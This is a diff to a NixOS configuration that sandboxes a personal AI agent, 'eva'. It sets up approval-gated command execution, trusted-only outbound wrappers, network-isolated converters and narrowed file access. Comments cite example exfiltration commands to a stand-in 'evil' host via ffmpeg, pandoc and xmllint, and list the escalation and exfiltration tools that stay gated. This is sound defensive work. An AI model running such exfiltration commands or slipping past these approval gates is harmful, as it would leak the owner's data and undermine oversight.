@@ -511,12 +511,56 @@ let
         fallbackModels = [ ];
         settings.agents.defaults.subagents.model = "anthropic/claude-sonnet-4-6";
 
+        # Heartbeat: eva takes an autonomous turn every 2h, but only during
+        # waking hours (08:00–22:00 Europe/Madrid, matching the host timezone) so
+        # she doesn't ping overnight. Driven by the module's first-class options
+        # (the every/activeHours defaults already match this; timezone is set
+        # explicitly so the window is local wall-clock, not the process TZ).
+        heartbeat = {
+          enable = true;
+          every = "2h";
+          activeHours = {
+            start = "08:00";
+            end = "22:00";
+            timezone = "Europe/Madrid";
+          };
+        };
+
+        # Extra tooling eva can invoke by name (the module puts each on the
+        # service PATH and in the system profile). Being reachable is separate
+        # from being unprompted; whether a run needs approval is
+        # decided by the exec allowlist below. ffmpeg/pandoc/xmllint are ALSO
+        # pre-blessed there (run unprompted); imagemagick and the python3/R
+        # interpreters are NOT — an actual invocation of those still raises the
+        # inline Telegram approval prompt. Kept here (not in the module) so the
+        # module stays deployment-agnostic. python3/R carry the packages she needs
+        # baked in, so `import requests` / `library(tidyverse)` resolve without a
+        # network fetch or a writable site-library.
+        extraPackages = with pkgs; [
+          ffmpeg # full ffmpeg (STT already pulls ffmpeg-headless; this adds codecs)
+          imagemagick # `convert`/`magick` image manipulation
+          libxml2.bin # `xmllint` (lives in the .bin output, not the default one)
+          pandoc # document conversion
+          (python3.withPackages (ps: with ps; [
+            requests
+            icalendar
+            vobject
+            python-dateutil
+            lxml
+          ]))
+          (rWrapper.override { packages = [ rPackages.tidyverse ]; })
+        ];
+
         # Eva's email: read her Maildir + a recipient-gated send-email helper.
         # These addresses (all the owner's own) send with no approval; every
         # other recipient falls through to the Telegram gate. The module generates
         # the send-email wrapper, read-only tools, allowlist rules and the skill.
+        # manageMaildir lets her organise her OWN mailbox unprompted (flag/refile/
+        # mkdir/incorporate/deliver) — local Maildir mutation only; sending still
+        # goes through the recipient-gated send-email path.
         mail = {
           enable = true;
+          manageMaildir = true;
           fromAddress = "e.lebbot@acpuchades.com";
           unpromptedRecipients = [
             "acp1337@proton.me"
@@ -526,22 +570,45 @@ let
           ];
         };
 
+        # Sanctioned self-gating action wrappers (see my.openclaw.actions). These
+        # are eva's ONLY unprompted outbound paths: request-trusted-url can GET/
+        # HEAD only *.acpuchades.com, and send-trusted-mail can only reach the
+        # trusted addresses below. Raw curl/wget/sendmail stay gated, and the
+        # policy skill tells eva to reach for these wrappers first.
+        actions = {
+          requestUrl = {
+            enable = true;
+            trustedSites = [ "*.acpuchades.com" ];
+          };
+          trustedMail = {
+            enable = true;
+            trustedAddresses = [
+              "acaravaca@bellvitgehospital.cat"
+              "acaravaca@idibell.cat"
+              "acp1337@proton.me"
+              "acaravacapuchades@gmail.com"
+              "acaravacapuchades@uoc.edu"
+              "acaravpu55@alumnes.ub.edu"
+            ];
+          };
+        };
+
         # Exec policy: allowlist + confirm-on-miss, via the module's first-class
         # options (pinned every start, so eva can't self-escalate at runtime).
         # Only allowlisted commands run unprompted; anything else raises an
         # approval request in the origin Telegram DM, answered inline.
         #
-        # safeBins is the pre-blessed set. It is the module's read-only default
-        # PLUS the observe-only system/text tools below — everything here either
-        # cannot mutate at all, or can only mutate with root (which eva has solely
-        # through the gated sudo grant, i.e. a DIFFERENT, still-prompted command
-        # string). Deliberately NOT pre-blessed, so they keep prompting: anything
-        # that writes/deletes, forks a shell, or evaluates code — sed/awk (in-
-        # place / system()), find (-exec/-delete), xargs, tee, cp/mv/rm, env,
-        # git (push/reset), systemctl, nix, docker, curl/wget, and the shells/
-        # interpreters. eva widens coverage for a SPECIFIC invocation at runtime
-        # without a rebuild via `openclaw approvals allowlist add "<glob>"` (e.g.
-        # "git status", "git diff*") — per-agent state, not re-seeded here.
+        # safeBins is the pre-blessed set: the module's read-only default PLUS the
+        # observe-only system/text tools AND the local filesystem mutators below
+        # (blessed because eva's WRITE surface is confined by permissions to her
+        # own tree + acpuchades-site — see access above). Deliberately NOT pre-
+        # blessed, so they keep prompting: the escalation/exfil vectors — sudo,
+        # the shells/interpreters and inline-eval, the exec-wrappers (env/timeout/
+        # tee/xargs), sed/awk in-place, find -exec/-delete (guarded), the network
+        # tools (curl/wget — use the request-trusted-url wrapper instead), and
+        # every REMOTE git verb (push/pull/fetch/clone). eva widens coverage for a
+        # SPECIFIC invocation at runtime without a rebuild via `openclaw approvals
+        # allowlist add "<glob>"` — per-agent state, not re-seeded here.
         exec = {
           # "allowlist" + ask "on-miss": a non-allowlisted command MISSES and
           # goes through the approval path. Under the native agent runtime
@@ -565,6 +632,35 @@ let
             "printf" "seq" "expr" "test" "namei" "pathchk"
             "sha1sum" "sha512sum" "b2sum" "base64" "base32"
             "xxd" "hexdump" "od" "strings"
+            # Filesystem MUTATION, blessed to run unprompted. This is safe ONLY
+            # because eva's writable surface is confined by permissions to her OWN
+            # tree, world-writable /tmp, and the single git-backed acpuchades-site
+            # repo (see `access` above — no nix-config, no /home/alex): the worst
+            # an injected prompt can do with these is trash eva's own disposable
+            # state/mailbox or the site working tree (recoverable from git), never
+            # the flake, the system config, or anything off-box. chown/chgrp are
+            # near-no-ops
+            # for a non-root single-group user (can't give files away). The real
+            # escalation/exfil vectors are DELIBERATELY absent and still gated:
+            # sudo, the shells/interpreters (bash/sh/python/R/node/perl), the
+            # exec-wrappers that would smuggle an unblessed command past the gate
+            # (env/timeout/nohup/nice/stdbuf/setsid/tee/xargs), in-place code
+            # editors (sed/awk -i), and the network tools (curl/wget) — those keep
+            # raising the Telegram approval prompt.
+            "mkdir" "rmdir" "touch" "cp" "mv" "ln" "mktemp" "truncate"
+            "rm" "unlink" "shred" "dd" "chmod" "chgrp" "chown"
+            # File discovery. `find` is whole-binary blessed but CONSTRAINED by
+            # the safeBinProfiles.find guard below (its mutating/exec predicates
+            # are denied), so `find . -type f` reads unprompted while
+            # `find . -delete` / `-exec` still MISS and raise the approval prompt.
+            "find"
+            # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
+            # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
+            # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
+            # blessed BARE (a bare invocation still prompts). Instead they are
+            # blessed only in the NETWORK-ISOLATED `offline <tool>` form via
+            # exec.netIsolatedBins below, which runs them unprompted but inside a
+            # no-network namespace where those URL fetches simply cannot connect.
           ];
           # Pre-seeded full-command-line globs (merged with eva's own runtime
           # additions). These bless read-only SUBCOMMANDS of tools too dangerous
@@ -576,12 +672,22 @@ let
           # invocation at runtime without a rebuild via `openclaw approvals
           # allowlist add "<glob>"` (per-agent state, not re-seeded here).
           allowlist = [
-            # git — read-only porcelain/plumbing only. NOT "git branch*"/"git
-            # tag*"/"git remote*" (they'd also match -d/-D/add/remove/rename).
+            # git — read-only porcelain/plumbing.
             "git status*" "git log*" "git diff*" "git show*" "git blame*"
             "git rev-parse*" "git describe*" "git ls-files*" "git shortlog*"
             "git reflog*" "git cat-file*" "git branch --list*" "git remote -v"
             "git config --get*" "git config --list*"
+            # git — LOCAL write subcommands. The remote is the security boundary,
+            # so committing/branching/staging/rewriting local history is blessed,
+            # but every network-touching verb is DELIBERATELY absent and keeps
+            # prompting: push, pull, fetch, clone, remote (add/set-url), submodule
+            # (can fetch), ls-remote. eva can commit freely; publishing always
+            # goes through the approval gate.
+            "git add*" "git commit*" "git restore*" "git checkout*"
+            "git switch*" "git stash*" "git reset*" "git mv*" "git rm*"
+            "git merge*" "git rebase*" "git cherry-pick*" "git revert*"
+            "git tag*" "git branch*" "git clean*" "git notes*"
+            "git worktree*" "git apply*" "git am*"
             # systemctl — inspection subcommands (status/show/list/is-* never
             # mutate). Restart/stop/start still go through her gated sudo grant.
             "systemctl status*" "systemctl show*" "systemctl cat*"
@@ -594,8 +700,34 @@ let
             "nix path-info*" "nix store ls*" "nix-instantiate --parse*"
             "nixos-version*"
           ];
+          # git push (and every other remote verb) is simply NOT in the allowlist
+          # above, so it misses and prompts every time — the remote is the
+          # boundary. No denylist needed; absence is the gate.
+          # Constrain the whole-binary `find` grant to read-only traversal: deny
+          # every predicate that mutates the filesystem or executes a program, so
+          # the agent can search unprompted but cannot turn find into an ungated
+          # delete/exec primitive. Any find command carrying one of these still
+          # MISSES and raises the inline approval prompt.
+          safeBinProfiles.find.deniedFlags = [
+            "-delete" "-exec" "-execdir" "-ok" "-okdir"
+            "-fls" "-fprint" "-fprintf" "-fprint0"
+          ];
+          # Network-capable converters: blessed ONLY in the `offline <tool>` form
+          # (module ships the `offline` unshare-net launcher and seeds
+          # `offline ffmpeg*` etc. into the allowlist). `offline ffmpeg …` runs
+          # unprompted but with no network, so it can't be turned into an exfil
+          # fetch; the bare tools stay gated.
+          netIsolatedBins = [ "ffmpeg" "ffprobe" "pandoc" "xmllint" ];
         };
         settings.tools.fs.workspaceOnly = false; # filesystem tools beyond the workspace (ACL-granted paths)
+        # Outbound Telegram attachments are gated to an allowlist of filesystem
+        # roots (channels.telegram.attachmentRoots). Eva's workspace is NOT a
+        # default root, so files she creates there (reports, converted media,
+        # generated docs) couldn't be sent — the "media folder restriction" she
+        # hit. Bless her workspace so she can attach anything she produces. The
+        # DM surface is locked to the single owner ID, so widening the send-from
+        # scope only ever delivers to the owner — not an exfil vector.
+        settings.channels.telegram.attachmentRoots = [ "/home/eva/workspace" ];
         # Exec approval prompts: make Telegram a NATIVE approval client so a
         # missed command raises an inline approve/deny prompt in the owner DM
         # (tap to allow-once / allow-always / deny) instead of blocking silently
@@ -681,37 +813,34 @@ let
           "/run/current-system/sw/bin/journalctl"
         ];
 
-        # Writable access to the two repos eva works on, plus execute-only
-        # ("X") traversal on the private parents in between — /home/alex is 0700
-        # and /srv/encrypted/alex{,/projects} are 0710, so without these eva
-        # cannot even reach the targets. X grants search (reach a known path),
-        # NOT listing (r): the intermediate dirs' other contents stay hidden.
+        # Eva's ONLY grant into alex's tree is write access to the acpuchades-site
+        # repo (she maintains it). Everything else is deliberately dropped: no
+        # nix-config (she can't tamper with the tracked flake ahead of a gated
+        # `sudo nixos-rebuild`), no pals project, and NO /home/alex traversal at
+        # all — so she can neither reach nor list anything of alex's except this
+        # one repo. The X (execute-only) entries on the private parents grant
+        # search-to-reach, NOT listing (r), so their other contents stay hidden;
+        # /srv/encrypted/alex{,/projects} are 0710, so without them eva couldn't
+        # descend to the repo. Reached via its REAL path (/home/alex/GitHub is an
+        # alex-only symlink she can no longer follow, since /home/alex is unlisted).
         #
-        # /home/alex/GitHub is a symlink to /srv/encrypted/alex/projects, so the
-        # site's real path is used here (the symlink itself needs no ACL; path
-        # resolution follows it, and /home/alex X covers reading the link).
-        # recursive + defaultAcl: cover what exists now AND what gets created
-        # later, so files eva or alex add stay mutually accessible.
+        # This confines eva's writable surface to: her own tree (/home/eva,
+        # /var/lib/openclaw), world-writable /tmp, and this one git-backed repo —
+        # which is what keeps the "full local mutation" exec allowlist below safe.
+        #
+        # NB: changing this stops RE-APPLYING dropped ACLs on switch but does NOT
+        # revoke entries already set (the grant is add-only). Clear the dropped
+        # ones by hand on the live host, then verify with getfacl (do NOT touch
+        # the /srv parents or acpuchades-site — those are still granted):
+        #   sudo setfacl -R -x u:eva,d:u:eva \
+        #     /home/alex/nix-config \
+        #     /srv/encrypted/alex/projects/pals-novartis-extant
+        #   sudo setfacl -x u:eva /home/alex
         access = {
-          "/home/alex" = { permissions = "X"; };
           "/srv/encrypted/alex" = { permissions = "X"; };
           "/srv/encrypted/alex/projects" = { permissions = "X"; };
-          "/home/alex/nix-config" = {
-            permissions = "rwX";
-            recursive = true;
-            defaultAcl = true;
-          };
           "/srv/encrypted/alex/projects/acpuchades-site" = {
             permissions = "rwX";
-            recursive = true;
-            defaultAcl = true;
-          };
-          # Read-only access to the pals-novartis-extant R project so eva can
-          # monitor run logs and read the analysis code. Reachable at
-          # /home/alex/GitHub/pals-novartis-extant (GitHub -> projects symlink).
-          # Bump to rwX if eva should edit/run scripts there.
-          "/srv/encrypted/alex/projects/pals-novartis-extant" = {
-            permissions = "rX";
             recursive = true;
             defaultAcl = true;
           };
